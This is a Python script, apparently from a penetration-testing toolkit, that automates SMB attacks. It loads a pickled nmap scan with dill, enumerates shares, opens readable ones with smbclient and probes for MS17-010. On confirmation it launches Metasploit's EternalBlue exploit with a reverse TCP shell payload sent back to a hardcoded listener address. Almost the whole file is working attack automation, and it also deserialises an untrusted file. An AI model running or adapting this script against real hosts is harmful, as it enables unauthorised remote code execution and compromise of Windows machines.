#!/usr/bin/env python3

import os
import dill
import argparse
import nmap


parser = argparse.ArgumentParser(description="FTP Auto")
parser.add_argument("-t", "--target", type=str, help="Choose a target/host")
parser.add_argument("-p", "--port", type=int, help="Choose a port")
help = "Choose an python-nmap class object file"
parser.add_argument("-f", "--filename", type=str)

args, unknown = parser.parse_known_args()
# Load the dill file saved from red_reishi.py
with open(args.filename, "rb") as f:
    nm = dill.load(f)
    f.close()


# each instance of nmap gets its own special nmap scan class object
smb_enum_shares = nmap.PortScanner()
eternalblue_nm = nmap.PortScanner()


def smb_enum():

    smb_os_discovery = False
    
    for port in nm[str(args.target)]["tcp"].items():
        
        # if the nmap class object imported from redreishi has a port that matches what was passed through argparse, continue with progam flow:
        if port[0] == args.port:
            print(f"Found SMB protocol on {args.target}, port {args.port}. State: {port[1]['state']}\n")

            # if the smb-os-discovery nmap script was run, program will attempt to print out results.
            try:
                for i in nm[args.target]["hostscript"]:
                    if (i["id"]) == "smb-os-discovery":
                        smb_os_discovery = True
                        print("Results of smb-os-discovery script:")
                        smb_info = i["output"].split("\n")
                        for i in smb_info:
                            print(i)
            except:
                print("smb-os-discovery script not run in original scan.")

            # if the smb-os-discovery nmap script was not run, program will attempt to print other information that was gathered.
            if smb_os_discovery is False:
                try:
                    print(f"Product: {port[1]['product']}")
                except:
                    print("No product type found.")
                try:
                    print(f"Version: {port[1]['version']}")
                except:
                    print("No version type found.")
                try:
                    print(f"CPE: {port[1]['cpe']}")
                except:
                    print("No CPE name found.")

            print(f"Attempting to run smb-enum-shares script on target.")
            smb_enum_shares.scan(args.target, arguments=f"-p {args.port} --script smb-enum-shares")
            try:
                enum = smb_enum_shares[args.target]["hostscript"][0]["output"].split("\n")
                for i in enum:
                    print(i)
                parsed_shares = []
                for i in enum:
                    i = i.replace("  ","")
                    print(i)
                    if "\\\\" in i:
                        i = i.replace("\\", "\\\\")
                        i = i[0:-2]
                        parsed_shares.append(i)
                
                    if "Anonymous access" in i:
                        parsed_shares.append(i)
                
                for i in parsed_shares:
                    print(i)
                
                x = 0
                for i in range(len(parsed_shares)):
                    if "." in parsed_shares[i]:
                        if "READ" in parsed_shares[i+1]:
                            os.system(f"smbclient {parsed_shares[i]}")
            except:
                print("Exception raised --- no shares found?")
            # present the user with choices.
            choice = input(
                """\n[1] Test target for EternalBlue vulnerabiltiy
[2] Run enum4linux -a (full basic enumeration)\n""")

            if choice == str(1):

                eternalblue_nm.scan(
                    args.target, arguments=f"-p {args.port} --script smb-vuln-ms17-010"
                )
                if (
                    "State: VULNERABLE"
                    in eternalblue_nm[args.target]["hostscript"][0]["output"]
                ):
                    print("Target is vulnerable to EternalBlue!")
                    choice = input("Attempt to exploit with msfconsole? y/n\n")
                    if choice.lower() == "y":
                        os.system(
                            f"""msfconsole -x "set LHOST 10.13.0.242; set RHOSTS {args.target}; set LPORT {args.port}; set payload windows/x64/shell/reverse_tcp; use exploit/windows/smb/ms17_010_eternalblue; exploit" """
                        )

            elif choice == str(2):
                os.system(f"enum4linux -a {args.target}")


smb_enum()


